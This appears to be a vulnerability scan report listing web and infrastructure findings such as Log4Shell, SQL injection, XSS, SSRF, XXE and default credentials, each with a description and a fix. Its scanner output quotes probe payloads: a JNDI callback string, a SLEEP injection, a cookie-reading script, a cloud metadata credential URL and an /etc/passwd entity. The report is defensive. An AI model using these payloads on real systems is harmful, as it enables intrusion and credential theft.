plugin_name: Rapid7 InsightVM — Remote Code Execution in Apache Struts
description: The Jakarta Multipart parser in Apache Struts 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.
solution: Upgrade Apache Struts to version 2.3.32 or 2.5.10.1. Apply WAF rules to block malformed multipart headers immediately.
plugin_output: Sent malformed Content-Type: multipart/form-data header. Server returned 500 with stack trace suggesting command execution path is reachable.

plugin_name: Rapid7 InsightVM — Apache Log4j Remote Code Execution (Log4Shell)
description: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP endpoints, allowing unauthenticated remote code execution.
solution: Upgrade log4j-core to version 2.17.1 or later. As an immediate workaround, set the system property -Dlog4j2.formatMsgNoLookups=true.
plugin_output: Injected ${jndi:ldap://callback.example.test/exploit} into User-Agent header. Out-of-band DNS and HTTP callback received, confirming JNDI lookup is processed.

plugin_name: Rapid7 InsightVM — Exposed Administrative Interface (Actuator Endpoint)
description: The Spring Boot Actuator /actuator/env endpoint is exposed without authentication. This endpoint discloses environment variables, configuration properties, and can be used to modify configuration at runtime in some versions.
solution: Restrict Actuator endpoints via management.endpoints.web.exposure.include configuration. Require authentication for all management endpoints in production.
plugin_output: GET /actuator/env returned HTTP 200 with full environment configuration including database credentials and API keys.

description: The reporting API endpoint /api/reports/generate is vulnerable to time-based blind SQL injection via the date_from parameter. An authenticated attacker can extract database contents including user credentials and PII.
solution: Replace string concatenation with parameterized queries. Enforce strict date format validation using a whitelist regex.
plugin_output: Parameter date_from injected with ' AND SLEEP(5)-- produced a 5-second response delay, confirming time-based blind SQL injection.

description: The /portal/search endpoint reflects the keyword parameter value in the HTTP response without proper HTML encoding. An attacker can craft a URL that injects arbitrary JavaScript into the page, which executes in the context of another user's browser session.
solution: Encode all user-supplied input before insertion into HTML context. Apply a strict Content-Security-Policy header.
plugin_output: Injected <script>alert(document.cookie)</script> via keyword parameter. Reflected unencoded in response body.

plugin_name: Rapid7 InsightVM — Server-Side Request Forgery in /api/integrations/webhook
description: The webhook integration endpoint at /api/integrations/webhook does not validate or restrict the callback_url parameter. An attacker can supply an internal IP address or cloud metadata endpoint as the target URL, causing the server to make requests to internal infrastructure.
solution: Validate callback_url against a strict allowlist of permitted external domains. Block RFC 1918 address ranges and cloud metadata endpoints (169.254.169.254, fd00::/8).
plugin_output: Supplied callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server fetched the URL and returned AWS instance role credentials in its error response.

plugin_name: Rapid7 InsightVM — Unencrypted Sensitive Data in Transit (HTTP)
description: The legacy API endpoint at legacy-api.internal:80 transmits authentication tokens and user session cookies over unencrypted HTTP. An attacker with network access can intercept and replay these credentials.
solution: Enforce HTTPS for all endpoints. Add HSTS headers. Redirect all HTTP traffic to HTTPS at the load balancer level.
plugin_output: Captured HTTP traffic containing Authorization headers with bearer tokens and Set-Cookie headers without the Secure flag.

plugin_name: Rapid7 InsightVM — Outdated and Vulnerable TLS Configuration
description: The host legacy-api.internal supports TLS 1.0 and TLS 1.1, which are deprecated protocols with known vulnerabilities including BEAST and POODLE. The server also advertises cipher suites using RC4 and 3DES, which are cryptographically weak.
solution: Disable TLS 1.0 and TLS 1.1. Enforce TLS 1.2 minimum with strong cipher suites. Prefer ECDHE key exchange. Remove RC4, 3DES, and export-grade ciphers from the cipher list.
plugin_output: TLS handshake succeeded with TLS 1.0 using cipher TLS_RSA_WITH_RC4_128_SHA. These protocol/cipher combinations are deprecated per NIST SP 800-52 Rev. 2.

plugin_name: Rapid7 InsightVM — Default Credentials on Admin Interface
description: The management interface at mgmt.internal:9090 accepts the default username 'admin' and password 'admin'. This provides full administrative access to system configuration, user management, and log access without requiring legitimate credentials.
solution: Immediately change all default credentials. Restrict management interface access to a VPN-only network segment. Implement multi-factor authentication for all admin accounts.
plugin_output: Successfully authenticated to the management interface with credentials admin:admin. Administrative dashboard loaded with full system access.

plugin_name: Rapid7 InsightVM — XML External Entity Injection (XXE) in /api/import
description: The /api/import endpoint parses XML from the request body without disabling external entity resolution. An attacker can use a crafted XML payload with an external entity reference to read arbitrary files from the server filesystem or perform server-side request forgery.
solution: Disable DOCTYPE declarations and external entity resolution in your XML parser configuration. Use a SAX-based parser configured with XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES set to false.
plugin_output: Submitted XML payload containing <!ENTITY xxe SYSTEM 'file:///etc/passwd'>. Server responded with the contents of /etc/passwd, confirming arbitrary file read via XXE.
